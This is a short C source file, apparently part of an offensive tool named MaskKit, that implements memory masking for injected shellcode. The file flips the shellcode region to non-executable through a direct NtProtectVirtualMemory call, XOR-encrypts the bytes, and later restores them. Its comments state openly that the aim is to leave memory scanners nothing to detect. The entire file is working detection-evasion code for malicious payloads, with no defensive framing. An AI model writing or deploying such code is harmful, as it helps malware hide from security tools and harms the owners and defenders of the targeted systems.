/*
 * mask.c — XOR memory masking for MaskKit.
 *
 * mask_on():
 *   1. Change shellcode region from PAGE_EXECUTE_READ → PAGE_READWRITE
 *   2. XOR-encrypt the bytes (key cycles over length)
 *   3. Leave as PAGE_READWRITE so scanners see non-executable garbage
 *
 * mask_off():
 *   1. XOR-decrypt the bytes (same operation — XOR is its own inverse)
 *   2. Change back to PAGE_EXECUTE_READ
 *
 * The protection change is as important as the XOR: even if a scanner
 * ignores the encrypted bytes, seeing a large RW region where a thread
 * was previously executing is a signal that the code was removed from
 * executable memory. The scanner finds no shellcode to scan.
 */
#include "masker.h"

void xor_region(uint8_t *data, size_t len, const uint8_t *key, uint32_t klen) {
    for (size_t i = 0; i < len; i++)
        data[i] ^= key[i % klen];
}

void mask_on(MASKER_CTX *ctx) {
    if (!ctx->sc_base || ctx->masking) return;
    ctx->masking = TRUE;

    /* PAGE_EXECUTE_READ → PAGE_READWRITE */
    PVOID base = ctx->sc_base;
    SIZE_T sz  = ctx->sc_size;
    ULONG old  = 0;
    _NtProtectVirtualMemory((HANDLE)-1, &base, &sz, PAGE_READWRITE, &old);

    /* XOR encrypt */
    xor_region((uint8_t *)ctx->sc_base, (size_t)ctx->sc_size, ctx->key, ctx->key_len);
}

void mask_off(MASKER_CTX *ctx) {
    if (!ctx->sc_base || !ctx->masking) return;

    /* XOR decrypt (same operation) */
    xor_region((uint8_t *)ctx->sc_base, (size_t)ctx->sc_size, ctx->key, ctx->key_len);

    /* PAGE_READWRITE → PAGE_EXECUTE_READ */
    PVOID base = ctx->sc_base;
    SIZE_T sz  = ctx->sc_size;
    ULONG old  = 0;
    _NtProtectVirtualMemory((HANDLE)-1, &base, &sz, PAGE_EXECUTE_READ, &old);

    ctx->masking = FALSE;
}
